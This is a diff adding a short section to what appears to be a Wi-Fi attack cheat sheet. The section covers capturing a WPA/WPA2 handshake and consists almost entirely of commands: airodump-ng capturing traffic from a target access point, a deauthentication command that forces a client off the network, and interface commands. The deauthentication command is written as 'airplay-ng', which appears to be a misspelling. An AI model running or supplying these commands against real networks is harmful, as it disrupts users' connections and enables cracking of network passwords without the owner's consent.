@@ -108,3 +108,13 @@
   > ifconfig wlan0 up 
   > ifconfig wlan0 
   ```
+  
+      ### WPA/WPA 2 
+    ####Capture Handshake File
+  Method 1 - Fake Authentication Attack
+```Bash
+  > airodump-ng --bssid AP:MA:C0:EE:VV --channel 11 --write handshakefilename mon0
+  > airplay-ng --deauth 4 -a AP:MA:C0:EE:VV -c CL:IE:NT:MA:C0 mon0
+  > ifconfig wlan0 up 
+  > ifconfig wlan0 
+  ```
